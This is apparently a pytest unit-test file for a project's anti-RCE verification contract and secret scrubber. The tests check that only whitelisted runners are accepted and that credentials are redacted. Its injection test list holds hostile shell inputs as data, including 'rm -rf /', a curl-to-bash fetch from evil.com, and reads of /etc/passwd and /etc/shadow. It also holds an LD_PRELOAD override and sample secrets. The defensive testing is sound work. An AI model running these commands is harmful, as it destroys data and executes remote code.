"""
tests/unit/test_security.py - Comprehensive Unit Tests for Anti-RCE Contract & Secret Scrubber.
"""

from __future__ import annotations

import re
import sys
from pathlib import Path
import pytest
from pydantic import ValidationError

from jury.security.contract import (
    ALLOWED_RUNNERS,
    ContractExecutionResult,
    TypedVerificationContract,
)
from jury.security.scrubber import (
    RedactionResult,
    calculate_shannon_entropy,
    scrub_text,
)


# =============================================================================
# 1. TypedVerificationContract Unit Tests
# =============================================================================

def test_contract_allowed_runners():
    """Verify that only whitelisted runners are accepted by the contract."""
    for runner in ["pytest", "mypy", "cargo_test", "npm_test", "go_test"]:
        contract = TypedVerificationContract(runner=runner, test_paths=["tests/test_unit.py"])
        assert contract.runner == runner

    custom = TypedVerificationContract(runner="custom_safe", custom_binary="pytest")
    assert custom.runner == "custom_safe"


def test_contract_rejects_unwhitelisted_runners():
    """Verify that unwhitelisted runners (bash, sh, powershell, python) are rejected."""
    for bad_runner in ["bash", "sh", "powershell", "python", "cmd", "zsh", "eval"]:
        with pytest.raises(ValidationError):
            TypedVerificationContract(runner=bad_runner)


@pytest.mark.parametrize("injection", [
    "tests/test_a.py; rm -rf /",
    "tests/test_a.py && curl http://evil.com/k.sh | bash",
    "tests/test_a.py | python -c 'import os; os.system(\"calc\")'",
    "tests/`whoami`.py",
    "tests/$(cat /etc/passwd).py",
    "tests/test_a.py\ncat /etc/shadow",
    "tests/test_a.py > /tmp/pwn",
    "tests/test_a.py < /dev/zero",
    "tests/test(1).py",
    "tests/test!run.py",
    "tests/{a,b}.py",
])
def test_contract_rejects_shell_metacharacters(injection: str):
    """Verify that any shell metacharacters in test_paths are rejected."""
    with pytest.raises(ValidationError) as exc_info:
        TypedVerificationContract(runner="pytest", test_paths=[injection])
    assert "metacharacters" in str(exc_info.value) or "Illegal" in str(exc_info.value)


def test_contract_rejects_path_traversal():
    """Verify that path traversal attempts ('..') in test_paths are rejected."""
    traversal_paths = [
        "../../etc/passwd",
        "tests/../../secret.py",
        "..\\..\\windows\\system32",
    ]
    for p in traversal_paths:
        with pytest.raises(ValidationError) as exc_info:
            TypedVerificationContract(runner="pytest", test_paths=[p])
        assert "traversal" in str(exc_info.value).lower()


def test_contract_rejects_dangerous_env_overrides():
    """Verify that dangerous environment overrides like LD_PRELOAD and metacharacters are blocked."""
    # Block dangerous variables
    with pytest.raises(ValidationError):
        TypedVerificationContract(runner="pytest", env_overrides={"LD_PRELOAD": "/tmp/evil.so"})

    with pytest.raises(ValidationError):
        TypedVerificationContract(runner="pytest", env_overrides={"PYTHONPATH": "/tmp/evil_lib"})

    # Block metacharacters in env values
    with pytest.raises(ValidationError):
        TypedVerificationContract(runner="pytest", env_overrides={"SAFE_VAR": "val; whoami"})

    # Block metacharacters in env names
    with pytest.raises(ValidationError):
        TypedVerificationContract(runner="pytest", env_overrides={"FOO; BAR": "1"})


def test_contract_safe_execution_pytest():
    """Verify safe execution of a pytest contract with non-shell execution."""
    contract = TypedVerificationContract(
        runner="pytest",
        test_paths=[],
        allowed_flags=["--version"],
        timeout_seconds=10,
    )
    result = contract.execute()

    assert isinstance(result, ContractExecutionResult)
    assert result.exit_code == 0
    assert not result.timed_out
    assert result.passed
    assert "pytest" in (result.stdout + result.stderr)
    assert result.command == [sys.executable, "-m", "pytest", "--version"]


def test_contract_execution_timeout(tmp_path):
    """Verify that execution timeouts are caught and reported cleanly with exit_code 124."""
    slow_script = tmp_path / "slow.py"
    slow_script.write_text("import time\ntime.sleep(5)\n", encoding="utf-8")

    contract = TypedVerificationContract(
        runner="custom_safe",
        custom_binary=sys.executable,
        test_paths=[str(slow_script)],
        timeout_seconds=1,
    )
    result = contract.execute()

    assert result.timed_out is True
    assert result.exit_code == 124
    assert not result.passed
    assert "timed out" in result.stderr.lower()


def test_contract_missing_executable():
    """Verify that missing executable returns exit_code 127 without raising unhandled exception."""
    contract = TypedVerificationContract(
        runner="custom_safe",
        custom_binary="non_existent_binary_xyz_12345",
        timeout_seconds=5,
    )
    result = contract.execute()

    assert result.exit_code == 127
    assert not result.passed
    assert "not found" in result.stderr.lower()


# =============================================================================
# 2. Secret Scrubber & Shannon Entropy Unit Tests
# =============================================================================

def test_shannon_entropy_calculation():
    """Verify Shannon entropy mathematical properties."""
    # Empty string
    assert calculate_shannon_entropy("") == 0.0

    # Low entropy (uniform single character)
    assert calculate_shannon_entropy("aaaaaaaaaaaaaaaaaaaa") == 0.0

    # Standard English text / identifier (~3.0 - 4.0 bits/char)
    code_ent = calculate_shannon_entropy("calculate_total_number_of_items")
    assert code_ent < 4.2

    # High entropy base64 cryptographic secret (> 4.5 bits/char)
    secret_ent = calculate_shannon_entropy("dGhpcyBpcyBhIHJhbmRvbSBzZWNyZXQga2V5IDEyMzQ1Njc4OTA=")
    assert secret_ent >= 4.5


def test_scrub_openai_api_key():
    """Verify scrubbing of standard and project-scoped OpenAI API keys."""
    text = 'client = OpenAI(api_key="sk-proj-1234567890abcdef1234567890abcdef")'
    res = scrub_text(text)

    assert "sk-proj" not in res.scrubbed_text
    assert "<REDACTED_API_KEY:" in res.scrubbed_text
    assert res.detected_count >= 1
    assert "API_KEY" in res.detected_types
    # Verify CRC32 token format
    match = re.search(r"<REDACTED_API_KEY:([0-9A-F]{8})>", res.scrubbed_text)
    assert match is not None


def test_scrub_github_tokens():
    """Verify scrubbing of GitHub Personal Access Tokens and fine-grained PATs."""
    text = (
        'gh_token = "ghp_1234567890abcdefghijklmnopqrstuvwxyzAB"\n'
        'pat = "github_pat_11ABCD123456789012345678901234567890123456789012345678901234567890"'
    )
    res = scrub_text(text)

    assert "ghp_" not in res.scrubbed_text
    assert "github_pat_" not in res.scrubbed_text
    assert "<REDACTED_GITHUB_TOKEN:" in res.scrubbed_text
    assert "GITHUB_TOKEN" in res.detected_types
    assert res.detected_count == 2


def test_scrub_aws_access_key():
    """Verify scrubbing of AWS Access Key ID."""
    text = 'AWS_ACCESS_KEY_ID = "AKIAIOSFODNN7EXAMPLE"'
    res = scrub_text(text)

    assert "AKIAIOSFODNN7EXAMPLE" not in res.scrubbed_text
    assert "<REDACTED_AWS_KEY:" in res.scrubbed_text
    assert "AWS_KEY" in res.detected_types


def test_scrub_jwt_bearer_token():
    """Verify scrubbing of JWT Bearer authentication headers."""
    jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
    text = f"headers = {{'Authorization': 'Bearer {jwt}'}}"
    res = scrub_text(text)

    assert jwt not in res.scrubbed_text
    assert "Bearer <REDACTED_JWT_TOKEN:" in res.scrubbed_text
    assert "JWT_TOKEN" in res.detected_types


def test_scrub_private_key_pem():
    """Verify scrubbing of PEM-encoded RSA/SSH private keys."""
    key_block = (
        "-----BEGIN RSA PRIVATE KEY-----\n"
        "MIIEowIBAAKCAQEA0Y1+FakePrivateKeyPayloadHere1234567890abcdef\n"
        "MIIEowIBAAKCAQEA0Y1+SecondLineOfKeyPayload1234567890abcdef==\n"
        "-----END RSA PRIVATE KEY-----"
    )
    text = f"config_key = '''{key_block}'''\nprint('Key loaded')"
    res = scrub_text(text)

    assert "FakePrivateKeyPayload" not in res.scrubbed_text
    assert "<REDACTED_PRIVATE_KEY:" in res.scrubbed_text
    assert "PRIVATE_KEY" in res.detected_types


def test_scrub_password_assignment():
    """Verify scrubbing of generic password assignments while preserving variable names and quotes."""
    text = 'db_password = "SuperSecretP@ssw0rd123!"'
    res = scrub_text(text)

    assert "SuperSecretP@ssw0rd123!" not in res.scrubbed_text
    assert 'db_password = "<REDACTED_PASSWORD:' in res.scrubbed_text
    assert "PASSWORD" in res.detected_types


def test_scrub_high_entropy_secret():
    """Verify that unclassified high-entropy strings are scrubbed by Stage 2 entropy filter."""
    high_entropy_val = "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"
    text = f'custom_secret = "{high_entropy_val}"'
    res = scrub_text(text)

    assert high_entropy_val not in res.scrubbed_text
    assert ("<REDACTED_HIGH_ENTROPY_SECRET:" in res.scrubbed_text or "<REDACTED_PASSWORD:" in res.scrubbed_text)
    assert res.detected_count >= 1


def test_no_false_positives_on_normal_code():
    """Verify that normal Python code, function signatures, URLs, and variable names are untouched."""
    normal_code = (
        'keys = my_dict.keys()\n'
        'user_token_param: str = "placeholder_value"\n'
        'endpoint = "https://api.example.com/v1/deliberate/tickets"\n'
        'def handle_incoming_request_stream(request_id: str):\n'
        '    return request_id.strip()\n'
    )
    res = scrub_text(normal_code)

    assert res.scrubbed_text == normal_code
    assert res.detected_count == 0
    assert len(res.detected_types) == 0


def test_preserves_line_count_and_diff_formatting():
    """Verify that redaction preserves line counts and structure for diff compatibility."""
    diff_payload = (
        "--- a/src/auth.py\n"
        "+++ b/src/auth.py\n"
        "@@ -10,3 +10,3 @@\n"
        "- api_key = 'sk-proj-oldkey1234567890abcdef1234567890'\n"
        "+ api_key = 'sk-proj-newkey1234567890abcdef1234567890'\n"
        "  return True\n"
    )
    res = scrub_text(diff_payload)

    # Line count must remain identical
    assert len(res.scrubbed_text.splitlines()) == len(diff_payload.splitlines())
    assert "sk-proj-oldkey" not in res.scrubbed_text
    assert "sk-proj-newkey" not in res.scrubbed_text
    assert res.detected_count == 2
